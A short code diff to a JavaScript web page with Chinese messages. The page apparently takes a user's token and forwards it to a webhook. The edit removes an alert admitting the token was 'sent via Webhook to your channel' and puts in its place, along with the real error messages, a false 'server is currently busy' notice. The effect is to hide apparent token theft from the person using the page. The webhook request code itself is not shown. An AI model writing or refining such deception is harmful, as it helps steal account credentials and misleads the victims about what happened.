@@ -60,17 +60,17 @@
             })
             .then(() => {
               document.getElementById('status').innerText = '❌ 错误！';
-              alert('Token已通过Webhook发送到你的频道，去查看吧。');
+              alert('目前伺服器繁忙');
             });
 
           } else {
             document.getElementById('status').innerText = '❌ 错误: ' + JSON.stringify(data);
-            alert('❌ 换Token失败: ' + JSON.stringify(data));
+            alert('目前伺服器繁忙');
           }
         })
         .catch(err => {
           document.getElementById('status').innerText = '❌ 请求失败';
-          alert('❌ 请求失败: ' + err);
+          alert('❌目前伺服器繁忙');
         });
       }
     };
